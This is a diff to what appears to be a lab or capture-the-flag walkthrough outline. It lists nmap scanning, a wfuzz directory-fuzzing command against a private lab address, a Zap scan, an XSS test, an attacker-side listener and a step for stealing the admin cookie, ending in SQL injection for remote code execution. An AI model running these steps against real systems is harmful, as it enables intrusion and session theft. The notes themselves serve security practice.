@@ -60,8 +60,13 @@
 #### 2.Access Admin Panel and exploit SQLi for RCE
 
 #### Port Scanning - nmap -sV -v -A lab_ip
-#### Scanning       - zap
+
+#### Fuzzing and Scanning - wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.168/FUZZ 2>/dev/null 
+#### Zap
+
+
 #### XSS Test
+
 #### setup listener on attacking machine - python -m SimpleHTTPServer 4444
 
 #### Get Admin Cookie - 
